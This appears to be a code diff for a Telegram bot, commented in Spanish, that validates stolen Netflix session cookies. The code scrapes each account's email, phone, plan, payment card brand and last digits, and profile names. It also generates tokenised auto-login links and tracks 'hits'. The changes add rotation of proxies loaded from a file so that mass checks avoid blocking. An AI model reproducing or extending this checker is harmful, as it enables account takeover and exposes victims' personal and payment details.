@@ -33,7 +33,7 @@ logger = logging.getLogger(__name__)
 # 🛡️ Palabras bloqueadas (SPAM)
 SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'bonus', 't.me/', 'https://t.me/', 'https://wndpr', 'https://bond']
 
-UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"
 
 COUNTRY_FLAGS = {"US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹","TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦","AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰","FI":"🇫🇮","PL":"🇵🇱","RU":"🇷🇺","AR":"🇦🇷","CL":"🇨🇱","CO":"🇨🇴","PE":"🇵🇪","AE":"🇦🇪","SA":"🇸🇦","EG":"🇪🇬","ZA":"🇿🇦","ID":"🇮🇩","MY":"🇲🇾","SG":"🇸🇬","TH":"🇹🇭","VN":"🇻🇳","PH":"🇵🇭","KE":"🇰🇪","NG":"🇳🇬","GH":"🇬🇭","PT":"🇵🇹","RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿","UA":"🇺🇦","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","IL":"🇮🇱","TW":"🇹🇼","HK":"🇭🇰","PK":"🇵🇰","BO":"🇧🇴","GT":"🇬🇹","EC":"🇪🇨","UY":"🇺🇾","NZ":"🇳🇿","ZW":"🇿🇼","SK":"🇸🇰","HR":"🇭🇷","RS":"🇷🇸","BG":"🇧🇬"}
@@ -102,7 +102,7 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
     if not netflix_id_raw: return None
     netflix_id = urllib.parse.unquote(str(netflix_id_raw))
     proxies = {"http": proxy, "https": proxy} if proxy else None
-    
+
     # Método 1: API iOS (Más rápido para tokens)
     headers = dict(_IOS_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
@@ -137,39 +137,37 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     3. Busca múltiples indicadores de validez para evitar falsos positivos.
     """
     if not any(cookies.get(k) for k in ["NetflixId","SecureNetflixId"]): return None
-    
+
     sess = requests.Session()
     sess.headers.update({
-        "User-Agent": UA_WEB, 
+        "User-Agent": UA_WEB,
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9",
         "DNT": "1"
     })
-    
-    for k, v in cookies.items(): 
+
+    for k, v in cookies.items():
         sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
-        
-    if proxy: 
+
+    if proxy:
         sess.proxies, sess.verify = {"http":proxy,"https":proxy}, False
-        
-    try: 
+
+    try:
         # Pedimos la página de cuenta principal
         r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
-    except: 
+    except:
         return None
-        
+
     # CRITERIO DE VALIDACIÓN MEJORADO
-    # En lugar de solo buscar una palabra, buscamos estructura de datos completa
     html = r.text
-    
+
     # Indicadores fuertes de que la cuenta está VIVA
     is_member = '"membershipStatus":"CURRENT_MEMBER"' in html
     has_email = '"emailAddress"' in html
     has_profile = '"profileName"' in html
-    
+
     # Si no cumple al menos 2 de 3, probablemente sea falso positivo o cookie vieja
     if not (is_member and has_email):
-        # A veces la redirección cambia la URL
         if "login" in r.url.lower() or r.status_code in (401, 403):
              return None
 
@@ -177,7 +175,7 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
     name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
     if not name: name = _djs(_rx(r'"firstName":"([^"]+)"', html))
-    
+
     cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")
     since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
     if not since:
@@ -185,18 +183,18 @@ def check_account(cookies: dict, proxy=None, timeout=20):
         if ts_raw and ts_raw.isdigit():
             try: since = datetime.utcfromtimestamp(int(ts_raw)/1000).strftime("%B %Y")
             except: since = "N/A"
-            
+
     plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
     plan_id = _rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', html)
     price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    
+
     q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
     quality_map = {"UHD":"UHD 4K","FHD":"FHD 1080p","HD":"HD 720p","SD":"SD 480p"}
     quality = quality_map.get(q_raw, q_raw or "N/A")
-    
+
     streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
     nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    
+
     _pm_start = html.find('"paymentMethods"')
     pm_raw = html[_pm_start:_pm_start+3000] if _pm_start>=0 else ""
     card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw)
@@ -204,41 +202,41 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     pay_type = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
     card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw)
     if not card_last4: card_last4 = _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
-    
+
     phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
     pv_raw = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
     phone_verified = pv_raw == "true"
-    
+
     extra_raw = _rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")
     extra_slots = int(extra_raw) if extra_raw.isdigit() else 0
-    
+
     can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in html
     free_trial = '"isInFreeTrial":true' in html
-    
+
     profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)]
     if not profiles: profiles = [_djs(p) for p in _rx_all(r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]
-    
+
     seen = set()
     profiles_clean = []
     for p in profiles:
         if p and p not in seen: seen.add(p); profiles_clean.append(p)
-        
+
     user_guid = _rx(r'"userGuid":"([^"]+)"', html)
     netflix_id_raw = cookies.get("NetflixId","")
-    
+
     # GENERAR TOKEN SI ES POSIBLE
     tok = generate_nftoken(netflix_id_raw, timeout, proxy=proxy) if netflix_id_raw else None
-    
+
     if tok:
         tok_safe = urllib.parse.quote(tok, safe="")
         login_pc = f"https://netflix.com/?nftoken={tok_safe}"
         login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
-    else: 
+    else:
         login_pc, login_phone = "N/A", "N/A"
-        
+
     login_tv = "https://www.netflix.com/tv2"
     display_name = name or (profiles_clean[0] if profiles_clean else "N/A")
-    
+
     return {
         "email":email or "N/A",
         "name":display_name,
@@ -268,10 +266,27 @@ def check_account(cookies: dict, proxy=None, timeout=20):
         "login_tv":login_tv
     }
 
+def load_proxies_from_file(filepath="proxies.txt"):
+    """Carga los proxies desde el archivo proxies.txt del repositorio"""
+    if not os.path.exists(filepath):
+        return []
+    with open(filepath, "r", encoding="utf-8") as f:
+        lines = [line.strip() for line in f if line.strip()]
+    clean_proxies = []
+    for p in lines:
+        if not p.startswith(("http://","https://","socks4://","socks5://")):
+            p = "http://" + p
+        clean_proxies.append(p)
+    return clean_proxies
+
 class NetflixChecker:
-    def __init__(self, threads=5, proxy=None, timeout=20):
+    def __init__(self, threads=5, proxy_list=None, timeout=20):
         self.threads, self.timeout = threads, timeout
-        self._proxy_list = proxy if isinstance(proxy, list) else ([proxy] if proxy else [])
+        # Si no hay lista, intenta cargar desde el archivo del repositorio
+        if not proxy_list:
+            proxy_list = load_proxies_from_file("proxies.txt")
+        
+        self._proxy_list = proxy_list if isinstance(proxy_list, list) else ([proxy_list] if proxy_list else [])
         self._proxy_index = 0
         self.lock = threading.Lock()
         self.stats = {"total":0,"checked":0,"hits":0,"bad":0,"errors":0,"start":time.time()}
@@ -329,10 +344,11 @@ class NetflixChecker:
         return {"total":self.stats["total"],"checked":self.stats["checked"],"hits":self.stats["hits"],"bad":self.stats["bad"],"errors":self.stats["errors"],"elapsed":f"{elapsed:.1f}s","cpm":f"{cpm:.1f}"}
 
 class NetflixCheckerBot:
-    def __init__(self, token):
+    def __init__(self, token, proxy_list=None):
         self.token = token
         self.app = Application.builder().token(token).build()
-        self.checker = NetflixChecker(threads=5)
+        # Pasamos la lista de proxies al checker
+        self.checker = NetflixChecker(threads=5, proxy_list=proxy_list)
         self.user_sessions = {}
         self.app.add_handler(CommandHandler("start", self.start_command))
         self.app.add_handler(CommandHandler("help", self.help_command))
@@ -519,9 +535,11 @@ class NetflixCheckerBot:
         await update.message.reply_text(caption, parse_mode="HTML", reply_markup=markup)
 
     def run(self):
-        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ATIVO - ADMIN PROTEGIDO")
+        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ATIVO - ADMIN PROTEGIDO - PROXIES AUTOMÁTICOS")
         self.app.run_polling()
 
 if __name__ == "__main__":
-    bot = NetflixCheckerBot(BOT_TOKEN)
+    # Cargamos los proxies desde el archivo del repositorio
+    proxy_list = load_proxies_from_file("proxies.txt")
+    bot = NetflixCheckerBot(BOT_TOKEN, proxy_list=proxy_list)
     bot.run()
